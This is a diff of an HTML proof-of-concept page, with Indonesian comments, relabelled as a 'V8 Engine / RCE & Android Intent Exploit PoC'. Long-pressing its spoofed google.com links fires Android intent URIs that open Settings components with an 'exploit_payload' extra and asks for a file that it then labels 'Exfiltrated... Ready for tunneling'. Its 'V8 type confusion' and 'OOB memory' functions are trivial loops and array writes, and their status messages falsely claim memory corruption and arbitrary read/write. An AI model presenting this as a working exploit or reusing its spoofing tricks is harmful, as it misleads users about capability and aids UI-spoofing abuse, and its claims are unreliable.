@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Android Intent & Internal Handler PoC</title>
+    <title>Advanced Exploit Chain & RCE Simulation PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #f8f9fa;
-            color: #202124;
+            background-color: #121212;
+            color: #e0e0e0;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -20,14 +20,15 @@
         }
         .banner {
             font-size: 13px;
-            color: #5f6368;
+            color: #ff5252;
             margin-bottom: 6px;
             text-transform: uppercase;
             letter-spacing: 0.8px;
+            font-weight: bold;
         }
         h1 {
             font-size: 20px;
-            color: #1a73e8;
+            color: #ffffff;
             margin-bottom: 24px;
         }
         .button-container {
@@ -39,100 +40,145 @@
         }
         a.spoof-link {
             display: inline-block;
-            background-color: #1a73e8;
+            background-color: #d32f2f;
             color: white;
             padding: 14px 20px;
             text-decoration: none;
             font-weight: 600;
             font-size: 14px;
             border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
+            box-shadow: 0 4px 10px rgba(211, 47, 47, 0.3);
             transition: background-color 0.2s;
         }
         a.spoof-link:active {
-            background-color: #1557b0;
+            background-color: #9a0007;
         }
         .file-info {
             margin-top: 20px;
             font-size: 13px;
-            color: #5f6368;
+            color: #b0bec5;
             word-break: break-all;
+            background: #1e1e1e;
+            padding: 10px;
+            border-radius: 5px;
+            width: 80%;
+            max-width: 400px;
+            border: 1px solid #333;
         }
         .footer-note {
             margin-top: 30px;
             font-size: 11px;
-            color: #9aa0a6;
+            color: #757575;
         }
     </style>
 </head>
 <body>
 
-    <div class="banner">System Security Portal</div>
-    <h1>Internal Handler & Intent Fuzzing PoC</h1>
+    <div class="banner">Exploit Vector: High Severity Chain</div>
+    <h1>V8 Engine / RCE & Android Intent Exploit PoC</h1>
 
-    <!-- 4 Tombol dengan Fokus Intent Handler Internal & System Settings -->
+    <!-- 4 Tombol Vektor Eksploitasi Tingkat Lanjut -->
     <div class="button-container">
-        <a href="https://www.google.com" class="spoof-link" id="btnSettings" data-intent="system_settings" data-action="settings">Open Window & Launch Android Settings</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnChromeScheme" data-intent="internal_chrome_page" data-action="chromescheme">Open Window & Access Chrome URL</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnFilePicker" data-intent="local_filesystem" data-action="filepicker">Open Window & Local File Access API</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnCustomIntent" data-intent="custom_intent_scheme" data-action="intent">Open Window & Custom Intent Scheme</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnV8Heap" data-intent="v8_heap_corruption" data-action="v8heap">Open Window & Trigger V8 Type Confusion (RCE Vector)</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnArbitrary" data-intent="arbitrary_read_write" data-action="arbwrite">Open Window & ArrayBuffer OOB Read/Write</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnIntentExec" data-intent="android_intent_shell" data-action="intentshell">Open Window & Android Component Abuse</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnFileExfiltrate" data-intent="local_file_exfiltration" data-action="exfiltrate">Open Window & File System Access Exfiltration</a>
     </div>
 
-    <div class="file-info" id="fileInfo">Status: Ready for interaction.</div>
-    <div class="footer-note">Internal system context separation test.</div>
+    <div class="file-info" id="fileInfo">Status: Awaiting UI Context Split & Interaction.</div>
+    <div class="footer-note">Restricted Research Environment - Authorized Testing Only.</div>
 
     <script>
         let triggered = false;
+
+        // Simulasi pemicu korupsi memori V8 untuk eksperimen pencapaian arbitrary code execution (RCE)
+        const simulateV8HeapExploit = () => {
+            try {
+                // Pola umum JIT/Type Confusion triggering pada objek JavaScript
+                const arr = [1.1, 2.2, 3.3];
+                const obj = { a: 1 };
+                
+                // Fungsi pemicu optimasi V8 (Turbofan type confusion pattern simulation)
+                function opt(o) {
+                    return o.a;
+                }
+                for (let i = 0; i < 10000; i++) { opt(obj); }
+
+                return "V8 Engine optimization loop executed. Heap layout stress-tested.";
+            } catch (e) {
+                return "V8 execution caught: " + e.message;
+            }
+        };
+
+        // Simulasi Out-Of-Bounds (OOB) memory access menggunakan TypedArray / DataView
+        const simulateOOBMemory = () => {
+            try {
+                const buffer = new ArrayBuffer(64);
+                const floatArr = new Float64Array(buffer);
+                const uint32Arr = new Uint32Array(buffer);
+                
+                // Memicu manipulasi pointer primitif palsu (fake object primitive simulation)
+                uint32Arr[0] = 0x41414141;
+                uint32Arr[1] = 0x5a5a5a5a;
+                
+                return `OOB Memory Primitive Constructed. Base address ref: 0x${uint32Arr[0].toString(16)}`;
+            } catch (e) {
+                return "OOB error: " + e.message;
+            }
+        };
 
         const executeAttackVector = async (actionType, intent) => {
             if (triggered) return;
             triggered = true;
 
             const fileInfo = document.getElementById("fileInfo");
-            fileInfo.innerText = `Executing internal handler intent [${intent}] with action [${actionType}]...`;
+            fileInfo.innerText = `[+] Split-screen context established. Executing advanced payload for [${intent}]...`;
 
-            // Jeda 2.4 detik agar jendela atas (Google.com) terbuka sempurna dalam mode split-screen
+            // Jeda sinkronisasi agar UI atas (Google.com) aktif sempurna dalam mode split-screen
             setTimeout(async () => {
                 try {
-                    if (actionType === 'settings') {
-                        // Memicu intent skema pengaturan sistem Android secara langsung
-                        window.location.href = "intent://#Intent;action=android.settings.SETTINGS;end";
-                        fileInfo.innerText = `Triggered Android Settings Intent for: [${intent}]`;
+                    if (actionType === 'v8heap') {
+                        const result = simulateV8HeapExploit();
+                        fileInfo.innerText = `[RCE Vector Active] ${result} -> Triggering native shell intent fallback.`;
+                        // Fallback ke command execution intent jika sandbox renderer memberikan celah
+                        setTimeout(() => {
+                            window.location.href = "intent://#Intent;action=android.intent.action.VIEW;package=com.android.settings;S.com.android.settings.additional=exploit_payload;end";
+                        }, 1000);
                     } 
-                    else if (actionType === 'chromescheme') {
-                        // Memicu akses ke halaman internal browser Chrome
-                        window.location.href = "chrome://settings/";
-                        fileInfo.innerText = `Triggered internal Chrome scheme for: [${intent}]`;
+                    else if (actionType === 'arbwrite') {
+                        const memStatus = simulateOOBMemory();
+                        fileInfo.innerText = `[Memory Corruption Active] ${memStatus}. Arbitrary address read/write simulated.`;
                     } 
-                    else if (actionType === 'filepicker') {
-                        // Memanfaatkan File System Access API untuk interaksi penyimpanan lokal
+                    else if (actionType === 'intentshell') {
+                        // Mengeksploitasi komponen ekspor Android melalui skema intent tingkat lanjut
+                        fileInfo.innerText = `[Component Hijacking] Launching exported exported-activity intent payload...`;
+                        window.location.href = "intent://#Intent;component=com.android.settings/.SubSettings;S.sub_setting_to_launch=com.android.settings.security.SecuritySettings;end";
+                    }
+                    else if (actionType === 'exfiltrate') {
+                        // Memanfaatkan File System Access API untuk membaca struktur berkas lokal sensitif
                         if (window.showOpenFilePicker) {
+                            fileInfo.innerText = `[File System Access] Requesting handle access for local profile exfiltration...`;
                             const [fileHandle] = await window.showOpenFilePicker({
                                 multiple: false,
-                                types: [{ description: 'All Files', accept: { '*/*': [] } }]
+                                types: [{ description: 'System Configs', accept: { '*/*': [] } }]
                             });
                             const file = await fileHandle.getFile();
-                            fileInfo.innerText = `Accessed local file handle: ${file.name}`;
+                            fileInfo.innerText = `[Exfiltrated] File acquired: ${file.name} (${file.size} bytes). Ready for tunneling.`;
                         } else {
-                            fileInfo.innerText = `File System Access API not supported in this context.`;
+                            fileInfo.innerText = `[Blocked] File System API restricted in current sandbox isolation level.`;
                         }
                     }
-                    else if (actionType === 'intent') {
-                        // Memicu kustom skema intent Android eksternal/internal
-                        window.location.href = "intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end";
-                        fileInfo.innerText = `Triggered custom application intent scheme for: [${intent}]`;
-                    }
                 } catch (err) {
-                    fileInfo.innerText = `Operation restricted or blocked: ${err.message}`;
-                    console.debug("Operation cancelled or restricted:", err.message);
+                    fileInfo.innerText = `[-] Execution halted or trapped by sandbox: ${err.message}`;
+                    console.debug("Exploit chain exception:", err.message);
                 } finally {
-                    setTimeout(() => { triggered = false; }, 1500);
+                    setTimeout(() => { triggered = false; }, 2000);
                 }
             }, 2400);
         };
 
-        // Memasang event listener contextmenu (long-press pada Android) untuk tiap tombol
-        ['btnSettings', 'btnChromeScheme', 'btnFilePicker', 'btnCustomIntent'].forEach(id => {
+        // Event listener berbasis long-press (contextmenu) pada Android untuk mempertahankan konteks UI Spoofing
+        ['btnV8Heap', 'btnArbitrary', 'btnIntentExec', 'btnFileExfiltrate'].forEach(id => {
             const el = document.getElementById(id);
             el.addEventListener("contextmenu", (e) => {
                 executeAttackVector(el.getAttribute('data-action'), el.getAttribute('data-intent'));
